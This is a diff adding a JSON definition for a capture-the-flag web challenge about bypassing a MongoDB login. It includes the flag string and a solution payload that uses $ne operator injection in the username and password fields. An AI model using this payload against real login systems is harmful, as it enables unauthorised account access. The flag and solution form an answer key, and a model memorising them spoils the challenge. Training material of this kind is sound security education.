@@ -1,0 +1,15 @@
+{
+  "vuln_type": "nosqli_auth_bypass",
+  "difficulty": "medium",
+  "title": "Startup DB Breach v2",
+  "description": "A new startup replaced their SQL database with MongoDB because it's 'web scale'. Can you bypass their login portal?",
+  "category": "web",
+  "flag": "CTF{mong0db_byp4ss3d_succ3ssfully_2024}",
+  "solution_payload": "{\"username\": {\"$ne\": \"invalid\"}, \"password\": {\"$ne\": \"invalid\"}}",
+  "learning_objectives": [
+    "Understand NoSQL operator injection",
+    "Exploit weakly typed JSON parsing in Node.js/Python APIS",
+    "Bypass authentication using $ne (Not Equal) operators"
+  ],
+  "user_id": "test_user_nosql"
+}
